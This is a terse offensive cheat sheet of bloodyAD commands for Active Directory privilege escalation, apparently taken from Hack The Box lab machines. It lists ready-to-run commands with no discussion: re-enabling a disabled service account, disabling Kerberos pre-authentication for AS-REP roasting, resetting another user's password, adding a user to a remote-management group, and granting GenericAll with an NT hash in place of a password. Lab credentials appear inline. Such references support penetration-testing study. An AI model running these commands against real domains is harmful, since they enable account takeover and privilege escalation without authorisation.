#### Enable Account

```bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.199.135 -u "p.rosa" -p Rosaisbest123 -k remove uac SVC_SQL -f ACCOUNTDISABLE
```
#### Enable ASREP on an Account

```bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.199.135 -u "p.rosa" -p Rosaisbest123 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
```
#### Change Users Password

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p username set password target_user new_password
```
#### Add User to a group

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p username add groupMember 'Remote Management Users' user_to_add
```
#### Add GenericAll to a user account

```bash
bloodyAD -d haze.htb --host 10.129.232.50 -u 'haze-IT-backup$' -p :4de830d1d58c14e241aff55f82ecdba1 add genericAll 'SUPPORT_SERVICES' 'haze-IT-backup$'
```

